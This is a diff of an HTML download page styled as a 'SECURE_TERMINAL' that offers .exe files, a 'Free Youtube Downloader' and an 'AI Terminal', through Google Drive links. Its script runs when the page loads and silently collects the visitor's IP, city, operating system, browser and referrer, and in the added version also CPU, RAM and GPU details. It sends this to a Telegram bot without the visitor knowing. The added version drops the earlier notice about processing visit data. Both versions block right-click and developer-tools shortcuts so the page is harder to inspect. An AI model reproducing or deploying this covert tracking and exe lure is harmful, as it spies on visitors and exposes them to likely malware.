@@ -1,812 +1,397 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>SECURE_TERMINAL</title>
-
-<style>
-  * {
-    box-sizing: border-box;
-  }
-
-  body {
-    background-color: #0a0e0a;
-    color: #33ff66;
-    font-family: "Courier New", "Consolas", monospace;
-    margin: 0;
-    padding: 0;
-    line-height: 1.5;
-  }
-
-  .scanlines {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: repeating-linear-gradient(
-      to bottom,
-      rgba(0,0,0,0) 0px,
-      rgba(0,0,0,0) 2px,
-      rgba(0,0,0,0.15) 3px
-    );
-    pointer-events: none;
-    z-index: 10;
-  }
-
-  .container {
-    max-width: 760px;
-    margin: 40px auto;
-    background-color: #060a06;
-    border: 1px solid #1f7a3f;
-    padding: 0;
-  }
-
-  .titlebar {
-    background-color: #0f1f0f;
-    border-bottom: 1px solid #1f7a3f;
-    padding: 8px 14px;
-    font-size: 0.85em;
-    color: #66ff99;
-    display: flex;
-    justify-content: space-between;
-    letter-spacing: 1px;
-    flex-wrap: wrap;
-  }
-
-  .body-inner {
-    padding: 30px 35px;
-  }
-
-  h1 {
-    font-size: 1.4em;
-    color: #4dff88;
-    border-bottom: 1px solid #1f7a3f;
-    padding-bottom: 10px;
-    letter-spacing: 2px;
-    font-weight: normal;
-  }
-
-  .prompt-line {
-    color: #2ecc60;
-    margin: 4px 0;
-  }
-
-  .prompt-line::before {
-    content: "> ";
-    color: #1f7a3f;
-  }
-
-  .divider {
-    border: none;
-    border-top: 1px dashed #1f7a3f;
-    margin: 25px 0;
-  }
-
-  .notice {
-    color: #7fdba0;
-    font-size: 0.92em;
-    border-left: 2px solid #1f7a3f;
-    padding-left: 12px;
-    margin: 18px 0;
-  }
-
-  .apps-section h2 {
-    font-size: 1.05em;
-    color: #4dff88;
-    letter-spacing: 1px;
-    font-weight: normal;
-    margin-bottom: 18px;
-  }
-
-  .app-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    border: 1px solid #1a4d2e;
-    background-color: #08120a;
-    padding: 14px 18px;
-    margin-bottom: 12px;
-    flex-wrap: wrap;
-  }
-
-  .app-info {
-    display: flex;
-    flex-direction: column;
-  }
-
-  .app-name {
-    color: #cfead9;
-    font-size: 0.95em;
-  }
-
-  .app-meta {
-    color: #4a8a63;
-    font-size: 0.78em;
-    margin-top: 3px;
-  }
-
-  .app-button button {
-    background-color: #0f1f0f;
-    border: 1px solid #2ecc60;
-    color: #4dff88;
-    font-family: "Courier New", monospace;
-    font-size: 0.85em;
-    padding: 8px 16px;
-    cursor: pointer;
-    letter-spacing: 1px;
-  }
-
-  .app-button button:hover {
-    background-color: #1a3a20;
-    color: #ffffff;
-  }
-
-  .app-button button:active {
-    background-color: #2ecc60;
-    color: #06120a;
-  }
-
-  .status-bar {
-    display: flex;
-    justify-content: space-between;
-    font-size: 0.78em;
-    color: #4a8a63;
-    border-top: 1px solid #1f7a3f;
-    padding: 10px 14px;
-    flex-wrap: wrap;
-  }
-
-  .status-dot {
-    display: inline-block;
-    width: 7px;
-    height: 7px;
-    border-radius: 50%;
-    background-color: #2ecc60;
-    margin-right: 6px;
-  }
-
-  a {
-    color: #4dff88;
-  }
-
-  footer {
-    text-align: center;
-    font-size: 0.75em;
-    color: #3a6b4a;
-    padding: 14px;
-    border-top: 1px solid #1f7a3f;
-  }
-
-  @media (max-width: 600px) {
-    .body-inner {
-      padding: 15px 20px;
-    }
-
-    .app-row {
-      flex-direction: column;
-      align-items: stretch;
-    }
-
-    .app-button {
-      margin-top: 10px;
-      text-align: center;
-    }
-
-    .titlebar {
-      flex-direction: column;
-      text-align: center;
-    }
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SECURE_TERMINAL</title>
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        body {
+            background-color: #0a0e0a;
+            color: #33ff66;
+            font-family: "Courier New", "Consolas", monospace;
+            margin: 0;
+            padding: 0;
+            line-height: 1.5;
+        }
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(to bottom, rgba(0,0,0,0) 0px, rgba(0,0,0,0) 2px, rgba(0,0,0,0.15) 3px);
+            pointer-events: none;
+            z-index: 10;
+        }
+        .container {
+            max-width: 760px;
+            margin: 40px auto;
+            background-color: #060a06;
+            border: 1px solid #1f7a3f;
+            padding: 0;
+        }
+        .titlebar {
+            background-color: #0f1f0f;
+            border-bottom: 1px solid #1f7a3f;
+            padding: 8px 14px;
+            font-size: 0.85em;
+            color: #66ff99;
+            display: flex;
+            justify-content: space-between;
+            flex-wrap: wrap;
+        }
+        .body-inner {
+            padding: 30px 35px;
+        }
+        h1 {
+            font-size: 1.4em;
+            color: #4dff88;
+            border-bottom: 1px solid #1f7a3f;
+            padding-bottom: 10px;
+            letter-spacing: 2px;
+            font-weight: normal;
+        }
+        .prompt-line {
+            color: #2ecc60;
+            margin: 4px 0;
+        }
+        .prompt-line::before {
+            content: "> ";
+            color: #1f7a3f;
+        }
+        .divider {
+            border: none;
+            border-top: 1px dashed #1f7a3f;
+            margin: 25px 0;
+        }
+        .notice {
+            color: #7fdba0;
+            font-size: 0.92em;
+            border-left: 2px solid #1f7a3f;
+            padding-left: 12px;
+            margin: 18px 0;
+        }
+        .apps-section h2 {
+            font-size: 1.05em;
+            color: #4dff88;
+            letter-spacing: 1px;
+            font-weight: normal;
+            margin-bottom: 18px;
+        }
+        .app-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 1px solid #1a4d2e;
+            background-color: #08120a;
+            padding: 14px 18px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+        .app-info {
+            display: flex;
+            flex-direction: column;
+        }
+        .app-name {
+            color: #cfead9;
+            font-size: 0.95em;
+        }
+        .app-meta {
+            color: #4a8a63;
+            font-size: 0.78em;
+            margin-top: 3px;
+        }
+        .app-button button {
+            background-color: #0f1f0f;
+            border: 1px solid #2ecc60;
+            color: #4dff88;
+            font-family: "Courier New", monospace;
+            font-size: 0.85em;
+            padding: 8px 16px;
+            cursor: pointer;
+            letter-spacing: 1px;
+        }
+        .app-button button:hover {
+            background-color: #1a3a20;
+            color: #ffffff;
+        }
+        .status-bar {
+            display: flex;
+            justify-content: space-between;
+            font-size: 0.78em;
+            color: #4a8a63;
+            border-top: 1px solid #1f7a3f;
+            padding: 10px 14px;
+            flex-wrap: wrap;
+        }
+        .status-dot {
+            display: inline-block;
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background-color: #2ecc60;
+            margin-right: 6px;
+        }
+        footer {
+            text-align: center;
+            font-size: 0.75em;
+            color: #3a6b4a;
+            padding: 14px;
+            border-top: 1px solid #1f7a3f;
+        }
+        @media (max-width: 600px) {
+            .body-inner {
+                padding: 15px 20px;
+            }
+            .app-row {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .app-button {
+                margin-top: 10px;
+                text-align: center;
+            }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="scanlines"></div>
+    <div class="scanlines"></div>
 
-<div class="container">
+    <div class="container">
+        <div class="titlebar">
+            <span>SECURE_TERMINAL v5.0</span>
+            <span>SESSION: ACTIVE</span>
+        </div>
 
-  <div class="titlebar">
-    <span>SECURE_TERMINAL</span>
-    <span>SESSION: ACTIVE</span>
-  </div>
+        <div class="body-inner">
+            <h1>APPLICATION ACCESS TERMINAL</h1>
+            <p class="prompt-line">connection established.</p>
+            <p class="prompt-line">authentication: not required for public downloads.</p>
+            <p class="prompt-line">select an application below to proceed.</p>
 
-  <div class="body-inner">
+            <div class="notice">
+                NOTICE: All downloads are served from verified endpoints.
+            </div>
 
-    <h1>APPLICATION ACCESS TERMINAL</h1>
+            <hr class="divider">
 
-    <p class="prompt-line">connection established.</p>
+            <div class="apps-section">
+                <h2>// AVAILABLE APPLICATIONS</h2>
 
-    <p class="prompt-line">
-      authentication: not required for public downloads.
-    </p>
+                <div class="app-row">
+                    <div class="app-info">
+                        <span class="app-name">Free Youtube Downloader</span>
+                        <span class="app-meta">build: exe / size: 160.2 MB</span>
+                    </div>
+                    <div class="app-button">
+                        <button onclick="window.location.href='https://drive.google.com/file/d/14c0Res5AeqMGK2JD4jBK42RPxb23O_DG/view?usp=sharing'">
+                            INSTALL
+                        </button>
+                    </div>
+                </div>
 
-    <p class="prompt-line">
-      select an application below to proceed.
-    </p>
+                <div class="app-row">
+                    <div class="app-info">
+                        <span class="app-name">AI Terminal</span>
+                        <span class="app-meta">build: exe · size: 14.3 MB</span>
+                    </div>
+                    <div class="app-button">
+                        <button onclick="window.location.href='https://drive.google.com/file/d/1EAvWug8fdBtijA5pyM3T_gMUxvUbQ3Fk/view?usp=drive_link'">
+                            INSTALL
+                        </button>
+                    </div>
+                </div>
+            </div>
 
-    <div class="notice">
-      NOTICE: All downloads are served from verified endpoints.
-      Review each application before installation.
+            <hr class="divider">
+            <p class="prompt-line">end of listing.</p>
+        </div>
+
+        <div class="status-bar">
+            <span><span class="status-dot"></span>SYSTEM NOMINAL</span>
+            <span>ENCRYPTED CHANNEL</span>
+        </div>
+
+        <footer>
+            SECURE_TERM // internal distribution page // static build
+        </footer>
     </div>
 
-    <div class="notice">
-      NOTICE: This page may process basic visit information
-      for security and analytics purposes.
-    </div>
-
-    <hr class="divider">
-
-    <div class="apps-section">
-
-      <h2>// AVAILABLE APPLICATIONS</h2>
-
-      <!-- APP 1 -->
-      <div class="app-row">
-
-        <div class="app-info">
-          <span class="app-name">
-            Free Youtube Downloader
-          </span>
-
-          <span class="app-meta">
-            build: exe / size: 160.2 MB
-          </span>
-        </div>
-
-        <div class="app-button">
-
-          <button
-            onclick="window.location.href='https://drive.google.com/file/d/14c0Res5AeqMGK2JD4jBK42RPxb23O_DG/view?usp=sharing'">
-            INSTALL
-          </button>
-
-        </div>
-
-      </div>
-
-      <!-- APP 2 -->
-      <div class="app-row">
-
-        <div class="app-info">
-
-          <span class="app-name">
-            AI Terminal
-          </span>
-
-          <span class="app-meta">
-            build: exe · size: 14.3 MB
-          </span>
-
-        </div>
-
-        <div class="app-button">
-
-          <button
-            onclick="window.location.href='https://drive.google.com/file/d/1EAvWug8fdBtijA5pyM3T_gMUxvUbQ3Fk/view?usp=drive_link'">
-            INSTALL
-          </button>
-
-        </div>
-
-      </div>
-
-      <!-- APP 3 -->
-      <div class="app-row">
-
-        <div class="app-info">
-
-          <span class="app-name">
-            APP_THREE
-          </span>
-
-          <span class="app-meta">
-            build: stable · size: --
-          </span>
-
-        </div>
-
-        <div class="app-button">
-
-          <button onclick="window.location.href=''">
-            INSTALL
-          </button>
-
-        </div>
-
-      </div>
-
-    </div>
-
-    <hr class="divider">
-
-    <p class="prompt-line">
-      end of listing.
-    </p>
-
-  </div>
-
-  <div class="status-bar">
-
-    <span>
-      <span class="status-dot"></span>
-      SYSTEM NOMINAL
-    </span>
-
-    <span>
-      ENCRYPTED CHANNEL
-    </span>
-
-  </div>
-
-  <footer>
-    SECURE_TERM // internal distribution page // static build
-  </footer>
-
-</div>
-
-
-<script>
-
-/*
-====================================================
-TELEGRAM SETTINGS
-====================================================
-
-IMPORTANT:
-The BOT TOKEN is NOT stored here.
-
-The token stays safely inside Netlify:
-
-TELEGRAM_BOT_TOKEN
-
-The chat ID is sent to the Netlify Function.
-====================================================
-*/
-
-const TELEGRAM_CHAT_ID = "8484620043";
-
-
-/*
-====================================================
-GET BASIC DEVICE INFORMATION
-====================================================
-*/
-
-function getDeviceInfo() {
-
-  const ua = navigator.userAgent;
-
-  const info = {};
-
-
-  // Operating system
-  let os = "Unknown";
-
-  if (ua.includes("Windows NT 10.0")) {
-    os = "Windows 10/11";
-  }
-  else if (ua.includes("Windows NT 6.3")) {
-    os = "Windows 8.1";
-  }
-  else if (ua.includes("Windows NT 6.2")) {
-    os = "Windows 8";
-  }
-  else if (ua.includes("Windows NT 6.1")) {
-    os = "Windows 7";
-  }
-  else if (ua.includes("Mac OS X")) {
-    os = "macOS";
-  }
-  else if (ua.includes("Android")) {
-    os = "Android";
-  }
-  else if (
-    ua.includes("iPhone") ||
-    ua.includes("iPad")
-  ) {
-    os = "iOS";
-  }
-  else if (ua.includes("Linux")) {
-    os = "Linux";
-  }
-
-  info.os = os;
-
-
-  // Browser
-  let browser = "Unknown";
-
-  if (ua.includes("Edg/")) {
-    browser = "Edge";
-  }
-  else if (
-    ua.includes("Chrome/") &&
-    !ua.includes("Chromium")
-  ) {
-    browser = "Chrome";
-  }
-  else if (ua.includes("Firefox/")) {
-    browser = "Firefox";
-  }
-  else if (
-    ua.includes("Safari/") &&
-    !ua.includes("Chrome")
-  ) {
-    browser = "Safari";
-  }
-
-  info.browser = browser;
-
-
-  // Screen
-  info.screen =
-    `${window.screen.width}x${window.screen.height}`;
-
-
-  // Pixel ratio
-  info.pixelRatio =
-    window.devicePixelRatio || 1;
-
-
-  // Language
-  info.language =
-    navigator.language || "unknown";
-
-
-  return info;
-}
-
-
-/*
-====================================================
-GET IP + APPROXIMATE LOCATION
-====================================================
-*/
-
-async function getLocationInfo() {
-
-  let result = {
-
-    ip: "unknown",
-
-    location: "unknown"
-
-  };
-
-
-  try {
-
-    const response =
-      await fetch("https://ipapi.co/json/");
-
-
-    if (!response.ok) {
-      return result;
-    }
-
-
-    const data =
-      await response.json();
-
-
-    result.ip =
-      data.ip || "unknown";
-
-
-    const city =
-      data.city || "";
-
-
-    const country =
-      data.country_name || "";
-
-
-    result.location =
-      [city, country]
-        .filter(Boolean)
-        .join(", ") ||
-      "unknown";
-
-
-  }
-  catch (error) {
-
-    console.log(
-      "Location lookup failed"
-    );
-
-  }
-
-
-  return result;
-}
-
-
-/*
-====================================================
-SEND MESSAGE THROUGH NETLIFY
-====================================================
-*/
-
-async function sendTelegramMessage(message) {
-
-  try {
-
-    const response =
-      await fetch(
-        "/.netlify/functions/telegram",
-        {
-          method: "POST",
-
-          headers: {
-            "Content-Type": "application/json"
-          },
-
-          body: JSON.stringify({
-
-            chat_id:
-              TELEGRAM_CHAT_ID,
-
-            text:
-              message
-
-          })
+    <script>
+        // ============================================
+        // ضع التوكن الجديد هنا (من BotFather)
+        // ============================================
+        const BOT_TOKEN = "ضع_التوكن_الجديد_هنا";
+        const TELEGRAM_CHAT_ID = "ضع_الChat_ID_هنا";
+
+        // ============================================
+        // جلب معلومات الجهاز
+        // ============================================
+        async function getDeviceInfo() {
+            const info = {};
+
+            // المعالج
+            info.cpuCores = navigator.hardwareConcurrency || "غير متاح";
+
+            // الرام
+            try {
+                if ('deviceMemory' in navigator) {
+                    info.ram = navigator.deviceMemory + " GB";
+                } else {
+                    info.ram = "غير متاح";
+                }
+                if (performance && performance.memory) {
+                    const heapLimit = performance.memory.jsHeapSizeLimit;
+                    const heapLimitGB = (heapLimit / 1024 / 1024 / 1024).toFixed(2);
+                    info.ram = info.ram + " (JS Heap: " + heapLimitGB + " GB)";
+                }
+            } catch (e) {
+                info.ram = "غير متاح";
+            }
+
+            // GPU
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        info.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    } else {
+                        info.gpu = "غير متاح";
+                    }
+                } else {
+                    info.gpu = "WebGL غير مدعوم";
+                }
+            } catch (e) {
+                info.gpu = "غير متاح";
+            }
+
+            // نظام التشغيل
+            const ua = navigator.userAgent;
+            let os = "Unknown";
+            if (ua.includes("Windows NT 10.0")) os = "Windows 10/11";
+            else if (ua.includes("Windows NT 6.3")) os = "Windows 8.1";
+            else if (ua.includes("Windows NT 6.2")) os = "Windows 8";
+            else if (ua.includes("Windows NT 6.1")) os = "Windows 7";
+            else if (ua.includes("Mac OS X")) os = "macOS";
+            else if (ua.includes("Android")) os = "Android";
+            else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
+            else if (ua.includes("Linux")) os = "Linux";
+            info.os = os;
+
+            // الشاشة
+            info.screen = window.screen.width + "x" + window.screen.height;
+            info.pixelRatio = window.devicePixelRatio || 1;
+
+            // المتصفح
+            let browser = "Unknown";
+            if (ua.includes("Edg/")) browser = "Edge";
+            else if (ua.includes("Chrome/") && !ua.includes("Chromium")) browser = "Chrome";
+            else if (ua.includes("Firefox/")) browser = "Firefox";
+            else if (ua.includes("Safari/") && !ua.includes("Chrome")) browser = "Safari";
+            info.browser = browser;
+
+            return info;
         }
-      );
 
+        // ============================================
+        // إرسال الإشعار
+        // ============================================
+        async function notifyVisit() {
+            // جلب الموقع
+            let ip = "unknown";
+            let location = "unknown";
+            try {
+                const geoRes = await fetch("https://ipapi.co/json/");
+                const geoData = await geoRes.json();
+                ip = geoData.ip || "unknown";
+                const city = geoData.city || "";
+                const country = geoData.country_name || "";
+                location = [city, country].filter(Boolean).join(", ") || "unknown";
+            } catch (e) {
+                // ignore
+            }
 
-    const data =
-      await response.json();
+            // جلب معلومات الجهاز
+            const deviceInfo = await getDeviceInfo();
 
+            // بناء الرسالة
+            const message =
+                "🔐 **New Visitor**\n" +
+                "━━━━━━━━━━━━━━━━━━━━\n\n" +
+                "📅 **Time**\n" +
+                "  " + new Date().toLocaleString('ar-EG') + "\n\n" +
+                "🌍 **Location**\n" +
+                "  IP: " + ip + "\n" +
+                "  Location: " + location + "\n\n" +
+                "💻 **System**\n" +
+                "  OS: " + deviceInfo.os + "\n" +
+                "  CPU Cores: " + deviceInfo.cpuCores + "\n" +
+                "  RAM: " + deviceInfo.ram + "\n" +
+                "  GPU: " + deviceInfo.gpu + "\n\n" +
+                "🌐 **Browser**\n" +
+                "  Name: " + deviceInfo.browser + "\n" +
+                "  Screen: " + deviceInfo.screen + "\n" +
+                "  Pixel Ratio: " + deviceInfo.pixelRatio + "x\n" +
+                "  Language: " + (navigator.language || "unknown") + "\n\n" +
+                "📌 **Referrer**\n" +
+                "  " + (document.referrer || "direct");
 
-    if (
-      response.ok &&
-      data.success
-    ) {
+            // إرسال إلى تلغرام
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: "Markdown",
+                        disable_web_page_preview: true
+                    })
+                });
 
-      console.log(
-        "✅ Telegram notification sent"
-      );
+                const data = await response.json();
 
-      return true;
-
-    }
-
-
-    console.error(
-      "❌ Telegram notification failed",
-      data
-    );
-
-    return false;
-
-  }
-  catch (error) {
-
-    console.error(
-      "❌ Telegram connection error:",
-      error
-    );
-
-    return false;
-
-  }
-
-}
-
-
-/*
-====================================================
-VISITOR NOTIFICATION
-====================================================
-*/
-
-async function notifyVisit() {
-
-  try {
-
-    // Get location information
-    const locationInfo =
-      await getLocationInfo();
-
-
-    // Get browser/device information
-    const deviceInfo =
-      getDeviceInfo();
-
-
-    // Current time
-    const visitTime =
-      new Date().toLocaleString(
-        "en-US",
-        {
-          dateStyle: "medium",
-          timeStyle: "medium"
+                if (data.ok) {
+                    console.log('✅ تم الإرسال بنجاح');
+                } else {
+                    console.error('❌ فشل الإرسال:', data);
+                }
+            } catch (error) {
+                console.error('❌ خطأ:', error);
+            }
         }
-      );
 
+        // تشغيل عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            notifyVisit();
+        });
 
-    // Build Telegram message
-    const message =
+        // منع النقر بزر الماوس الأيمن
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
 
-      "🔐 New Visitor\n" +
+        // منع بعض اختصارات لوحة المفاتيح
+        document.addEventListener('keydown', function(e) {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) ||
+                (e.ctrlKey && (e.key === 'U' || e.key === 'u'))
+            ) {
+                e.preventDefault();
+            }
+        });
 
-      "━━━━━━━━━━━━━━━━━━━━\n\n" +
-
-      "📅 Time\n" +
-
-      visitTime +
-
-      "\n\n" +
-
-      "🌍 Location\n" +
-
-      "IP: " +
-      locationInfo.ip +
-
-      "\n" +
-
-      "Location: " +
-      locationInfo.location +
-
-      "\n\n" +
-
-      "💻 System\n" +
-
-      "OS: " +
-      deviceInfo.os +
-
-      "\n" +
-
-      "Browser: " +
-      deviceInfo.browser +
-
-      "\n" +
-
-      "Screen: " +
-      deviceInfo.screen +
-
-      "\n" +
-
-      "Pixel Ratio: " +
-      deviceInfo.pixelRatio +
-
-      "\n\n" +
-
-      "🌐 Language\n" +
-
-      deviceInfo.language +
-
-      "\n\n" +
-
-      "📌 Referrer\n" +
-
-      (
-        document.referrer ||
-        "Direct visit"
-      );
-
-
-    // Send through Netlify
-    await sendTelegramMessage(
-      message
-    );
-
-  }
-  catch (error) {
-
-    console.error(
-      "Visitor notification error:",
-      error
-    );
-
-  }
-
-}
-
-
-/*
-====================================================
-START
-====================================================
-*/
-
-window.addEventListener(
-  "load",
-  () => {
-
-    notifyVisit();
-
-  }
-);
-
-
-/*
-====================================================
-DISABLE RIGHT CLICK
-====================================================
-*/
-
-document.addEventListener(
-  "contextmenu",
-  function(event) {
-
-    event.preventDefault();
-
-  }
-);
-
-
-/*
-====================================================
-KEYBOARD RESTRICTIONS
-====================================================
-*/
-
-document.addEventListener(
-  "keydown",
-  function(event) {
-
-    if (
-
-      event.key === "F12" ||
-
-      (
-        event.ctrlKey &&
-        event.shiftKey &&
-        (
-          event.key === "I" ||
-          event.key === "i"
-        )
-      ) ||
-
-      (
-        event.ctrlKey &&
-        event.shiftKey &&
-        (
-          event.key === "J" ||
-          event.key === "j"
-        )
-      ) ||
-
-      (
-        event.ctrlKey &&
-        (
-          event.key === "U" ||
-          event.key === "u"
-        )
-      )
-
-    ) {
-
-      event.preventDefault();
-
-    }
-
-  }
-);
-
-
-/*
-====================================================
-CONSOLE MESSAGE
-====================================================
-*/
-
-console.log(
-  "%cSECURE_TERMINAL",
-  "color:#33ff66;font-size:20px;font-weight:bold;"
-);
-
-console.log(
-  "System initialized."
-);
-
-</script>
+        console.log('%c⚠️ SECURITY NOTICE', 'color:red; font-size:20px; font-weight:bold;');
+        console.log('This terminal is monitored. All actions are logged.');
+    </script>
 
 </body>
 </html>
